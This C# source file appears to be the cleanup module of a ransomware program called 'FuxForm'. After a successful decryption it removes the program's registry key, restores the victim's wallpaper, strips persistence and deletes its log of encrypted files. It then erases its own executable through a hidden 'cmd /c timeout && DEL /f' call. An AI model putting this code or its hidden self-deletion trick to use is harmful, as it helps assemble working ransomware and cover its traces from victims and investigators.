using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace FuxForm.Algorithms
{
    internal class DeleteFuncs
    {
        public static void DeleteAll()
        {
            Registry.CurrentUser.DeleteSubKeyTree(config.ProgramRegKey, false);
            if (DecryptFunctions.Decryptor() == "Success_Decrypt")
            {
                UserUtils.RestoreOriginalWallpaper();
                PersistenceModule.RemovePersistence();

                if (File.Exists(config.EncFiles_log))
                {
                    File.Delete(config.EncFiles_log);
                }

                SelfRemove();

            } else
            {
                MessageBox.Show("Failed to decrypt!");

            }       
        }

        private static void SelfRemove()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t 1 && DEL /f {currentProcessFileName} ";
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
    }
}
